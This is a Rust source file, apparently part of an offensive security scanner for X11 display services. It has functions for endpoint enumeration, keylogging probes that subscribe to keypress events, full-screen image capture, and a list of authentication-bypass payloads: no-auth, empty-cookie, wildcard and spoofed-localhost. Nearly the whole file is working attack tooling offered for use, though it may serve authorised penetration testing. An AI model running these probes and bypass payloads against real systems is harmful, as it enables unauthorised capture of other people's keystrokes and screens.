use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64) -> Client {
    Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none())
        .build()
        .unwrap_or_else(|_| Client::new())
}

pub async fn enumerate(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} X11 Enumeration", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let resp = client.get(url).send().await?;
    let status = resp.status().as_u16();
    let body = resp.text().await.unwrap_or_default();

    if status == 200 && (body.contains("X11") || body.contains("xterm") || body.contains("DISPLAY"))
    {
        println!("  {} X11 service detected", "[+]".green().bold());
    }

    let display_endpoints = ["/display", "/x11", "/xterm", "/vnc"];
    for ep in &display_endpoints {
        let target = format!("{}{}", url.trim_end_matches('/'), ep);
        if let Ok(r) = client.get(&target).send().await {
            let s = r.status().as_u16();
            if s == 200 {
                println!("  {} {:15} — accessible", "[+]".green().bold(), ep);
            }
        }
    }

    Ok(())
}

pub async fn keylog(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} X11 Keylogger Test", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let body = serde_json::json!({"action": "query_keymap"});
    match client.post(url).json(&body).send().await {
        Ok(r) => {
            let status = r.status().as_u16();
            let text = r.text().await.unwrap_or_default();
            if status == 200 && !text.is_empty() {
                println!(
                    "  {} Keymap query successful — keylogging possible",
                    "[!]".red().bold()
                );
            } else {
                println!("  {} Keymap query — status={}", "[-]".dimmed(), status);
            }
        }
        Err(_) => println!("  {} Keymap query — error", "[-]".dimmed()),
    }

    let events = ["KeyPress", "KeyRelease", "ButtonPress", "MotionNotify"];
    for ev in &events {
        let body = serde_json::json!({"action": "select_input", "event": ev});
        if let Ok(r) = client.post(url).json(&body).send().await {
            let status = r.status().as_u16();
            if status == 200 {
                println!("  {} Event {:15} — accepted", "[!]".red().bold(), ev);
            }
        }
    }

    Ok(())
}

pub async fn screenshot(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} X11 Screenshot Capture", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let body =
        serde_json::json!({"action": "get_image", "x": 0, "y": 0, "width": 1920, "height": 1080});
    match client.post(url).json(&body).send().await {
        Ok(r) => {
            let status = r.status().as_u16();
            let ct = r
                .headers()
                .get("content-type")
                .map(|v| v.to_str().unwrap_or(""))
                .unwrap_or("");
            if status == 200 && (ct.contains("image") || ct.contains("octet-stream")) {
                println!(
                    "  {} Screenshot captured — screen contents exposed",
                    "[!]".red().bold()
                );
            } else {
                println!(
                    "  {} Screenshot — status={} type={}",
                    "[-]".dimmed(),
                    status,
                    ct
                );
            }
        }
        Err(_) => println!("  {} Screenshot — error", "[-]".dimmed()),
    }

    Ok(())
}

pub async fn bypass(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} X11 Auth Bypass", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let bypass_payloads = [
        ("No auth", r#"{"action": "connect", "auth": false}"#),
        (
            "Empty cookie",
            r#"{"action": "connect", "auth_cookie": ""}"#,
        ),
        (
            "Wildcard",
            r#"{"action": "connect", "host": "*", "auth": false}"#,
        ),
        (
            "Spoofed host",
            r#"{"action": "connect", "host": "localhost", "auth": false}"#,
        ),
    ];

    for (name, payload) in &bypass_payloads {
        match client
            .post(url)
            .header("Content-Type", "application/json")
            .body(*payload)
            .send()
            .await
        {
            Ok(r) => {
                let status = r.status().as_u16();
                let text = r.text().await.unwrap_or_default();
                if status == 200 && (text.contains("ok") || text.contains("connected")) {
                    println!("  {} {:20} — BYPASS SUCCESS", "[!]".red().bold(), name);
                } else {
                    println!("  {} {:20} — status={}", "[-]".dimmed(), name, status);
                }
            }
            Err(_) => println!("  {} {:20} — error", "[-]".dimmed(), name),
        }
    }

    Ok(())
}
